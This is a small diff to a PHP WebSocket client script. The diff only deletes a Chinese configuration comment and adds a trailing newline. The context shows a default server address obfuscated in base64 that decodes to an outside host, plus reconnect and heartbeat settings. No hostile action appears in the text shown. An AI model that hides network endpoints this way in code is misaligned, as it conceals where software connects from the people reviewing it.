@@ -11,8 +11,6 @@ $_CFG = [];
 if (file_exists($_CFG_FILE)) {
     $_CFG = @json_decode(file_get_contents($_CFG_FILE), true) ?: [];
 }
-
-// 服务器配置（从配置文件读取，如果不存在则使用默认值）
 $WS_SERVER = $_CFG['s'] ?? base64_decode('d3M6Ly94aW5wcmludC56eXNoYXJlLnRvcDo4MDg5');
 $RECONNECT_INTERVAL = $_CFG['r'] ?? 5;
 $HEARTBEAT_INTERVAL = $_CFG['h'] ?? 30;
@@ -1243,3 +1241,4 @@ if ($client->connect()) {
         }
     }
 }
+
